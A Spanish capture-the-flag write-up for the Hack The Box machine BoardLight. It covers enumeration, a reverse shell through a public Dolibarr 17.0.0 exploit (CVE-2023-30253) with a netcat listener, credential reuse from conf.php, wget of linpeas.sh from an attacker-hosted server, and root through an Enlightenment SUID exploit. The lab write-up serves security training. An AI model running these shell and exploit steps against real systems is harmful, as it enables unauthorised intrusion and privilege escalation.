<h1>Enumeración</h1>
<p>Comenzamos la enumeración de la máquina víctima ejecutando un ping a la IP objetivo 10.10.11.11 para comprobar que la máquina está activa:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/9d4b7303-ca0f-4a1e-9f72-f86a23caea0e" alt="Ping result">
</p>
<p>Como podemos observar, la máquina está activa ya que nos devuelve el ping y, por el ttl=63, podemos intuir que estamos ante una máquina Linux.</p>
<p>Vamos ahora a realizar un escaneo sencillo con nmap para ver qué puertos están abiertos y qué servicios corren en ellos:</p>

sudo nmap -p- -sV -sS --min-rate 5000 -n 10.10.11.11 -oN scan.txt
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/e3c448fb-1c9d-4ca8-b66f-7a5373852a0d" alt="Nmap scan results">
</p>
<p>Podemos ver que los puertos 22 (SSH) y 80 (HTTP) están abiertos y corriendo un servidor OpenSSH y un servidor web Apache respectivamente, por lo que vamos a intentar acceder al servidor de Apache a través del navegador:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/0f393783-6013-45c9-9e85-b03800732a86" alt="Apache server">
</p>
<p>Como podemos ver, el servidor resuelve rápido la petición a través de la IP y llegamos a esta página de destino. Vamos a echar un vistazo a ver si vemos algo interesante...</p>
<p>Al tratarse de un sitio web hecho en PHP, podemos intentar explotar algún tipo de LFI empleando algún wrapper de PHP desde la propia URL del sitio. En concreto, si enviamos un formulario vacío que podemos encontrar en el pie de página, vemos que se realiza una petición (<code>10.10.11.11/index.php?</code>), vamos a ver si podemos explotarlo:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/a3d5eb64-457f-428d-be39-8eb23d05f860" alt="Empty form request">
</p>
<p>Como podemos ver en la petición del formulario, no se envía ningún tipo de dato y simplemente nos recarga la misma página de contacto:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/a3d5eb64-457f-428d-be39-8eb23d05f860" alt="Contact form response">
</p>
<p>Puesto que no podremos explotar un LFI ni un potencial SSRF, vamos a seguir con el proceso de enumeración haciendo fuzzing para encontrar directorios o subdominios potencialmente vulnerables. Un dato interesante es que encontramos un correo de contacto en el pie de página de la web que nos sugiere que existe un dominio <code>board.htb</code>.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/e7b003d9-e67c-40d4-8d33-19698f4402eb" alt="Email contact">
</p>
<p>Así que podemos añadir este dominio a nuestro <code>/etc/hosts</code> ya que si lo probamos en el navegador nos dirige al mismo servidor web.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/11714c8e-07da-4d02-a67f-3eb37fabba9c" alt="Adding domain to hosts">
</p>
<p>Ahora, vamos con el fuzzing. Usaremos la herramienta ffuf y un diccionario de SecList para ver qué encontramos:</p>
bash
Copiar código
sudo ffuf -u http://FUZZ.board.htb -t 200 -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
<p>Este comando con ffuf nos encuentra el subdominio <code>crm</code>, por lo que existe <code>crm.board.htb</code>. Vamos a añadirlo al <code>/etc/hosts</code> y a acceder a él a ver qué contiene:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/18bc9fb8-748e-4183-82f4-0734f35eb6d8" alt="Subdomain crm">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/d69fa083-1a2a-417c-84f0-0ac22077311b" alt="CRM login page">
</p>
<p>En este subdominio, podemos acceder a una página de inicio de sesión del conocido gestor de relaciones con los clientes, Dolibarr, en su versión 17.0.0.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/3b79efd3-dd75-45d2-b338-33ed3b440877" alt="Dolibarr login">
</p>
<p>Si buscamos algo de información en Google acerca de este software y dicha versión, podemos ver que existe una vulnerabilidad asociada que nos permite explotar ejecución remota de comandos (RCE) y otorgarnos una shell reversa. La vulnerabilidad está reportada como la CVE-2023-30253 y el repositorio de GitHub encontrado para esta vulnerabilidad, que contiene un script en Python, es el siguiente: <a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a>.</p>
<p>De este modo, vamos a descargarnos y a ejecutar el script en Python para otorgarnos una shell reversa del siguiente modo:</p>
bash
Copiar código
# En nuestra máquina local:
nc -lvnp 9001
# En la máquina víctima:
python3 exploit.py http://crm.board.htb admin admin 10.10.14.28 9001
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/2c3a47f3-58b0-4fa2-b995-993ec3ad8055" alt="Exploit execution">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/9892eec0-9b0e-4451-a8f0-0a0cb4f1e665" alt="Reverse shell">
</p>
<p>Si dentro de la máquina víctima retrocedemos un par de directorios hacia atrás en busca de algo interesante, podemos detenernos en la ruta <code>/htbdocs</code> y, si listamos el contenido con <code>ls -la</code>, podemos encontrar un fichero <code>conf.php</code> que puede resultar interesante para este tipo de servidores ya que suele contener usuarios y credenciales de alguna base de datos que se esté usando.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/72d83f29-d067-4ec4-8e2d-c65de7956112" alt="Config directory">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/c5118307-7d72-42ac-a226-935d1a332bce" alt="Config file">
</p>
<p>Y efectivamente, dentro de <code>config.php</code> encontramos credenciales de acceso para una base de datos MySQL.</p>
<p>Si intentamos acceder a la base de datos MySQL, el sistema nos indica que no tenemos permiso de acceso como usuario <code>www-data</code> por lo que tendremos que encontrar otra vía de acceso.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/fad76804-5738-4fb6-a192-d1f51ec81984" alt="MySQL access denied">
</p>
<p>Retrocediendo hasta el directorio <code>/home</code>, encontramos el directorio de un usuario a nivel de sistema llamado <code>larissa</code>, así que podemos probar a iniciar sesión en SSH con este usuario y con la credencial obtenida en <code>conf.php</code> mediante el script anterior de Python.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/1f8a1f5d-d523-45a5-93f2-93128b843ca7" alt="SSH login">
</p>
<p>Y una vez dentro del usuario de <code>larissa</code>, ya tenemos visible la primera flag, <code>user.txt</code>. Vamos ahora a por la bandera del root.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/33b7cd4b-0fe7-413c-8622-544562ffdf1c" alt="User flag">
</p>
<p>Como no tenemos ningún tipo de permiso elevado con este usuario, vamos a descargarnos el script <code>linpeas.sh</code> para realizar un escaneo exhaustivo en busca de alguna vulnerabilidad.</p>
<p>Descargamos el script en: <a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20240616-43d0a061">https://github.com/peass-ng/PEASS-ng/releases/tag/20240616-43d0a061</a></p>
bash
Copiar código
# En nuestra máquina local:
python3 -m http.server 3333
# En la máquina víctima:
wget 10.10.14.101:3333/linpeas.sh
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/dbf73b98-0b5b-4463-9fef-5f71d32425a2" alt="Downloading linpeas.sh">
</p>
<p>Y finalmente, le damos permisos y lo ejecutamos:</p>
chmod +x linpeas.sh
./linpeas.sh
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/0611dbdb-e80f-4ac3-ab16-af3659aa08f9" alt="Linpeas execution">
</p>
<p>Como podemos ver, el script nos reporta varias vulnerabilidades. En concreto, si nos dirigimos a la sección de ficheros con permisos interesantes, podemos encontrar concretamente 4 archivos en los que se indica que no se conoce el SUID en binario, lo cual podemos explotar.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/59237ecc-7b2e-4d66-af6f-dbb724e328ec" alt="Linpeas findings">
</p>
<p>En concreto, si buscamos <code>enlightenment suid exploit</code>, existe un repositorio en GitHub, así que vamos a descargarnos el exploit y a probarlo:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/e8202daf-eb53-4715-b933-9f1b30ba5df8" alt="Exploiting SUID">
</p>
<p>Y finalmente, hemos conseguido una terminal con el usuario root, encontramos la bandera en <code>/root</code> y hemos completado BoardLight, ¡Enhorabuena!</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/2d83e789-d114-4e3e-8bb7-fb4d713b81a7" alt="Root flag">
</p>
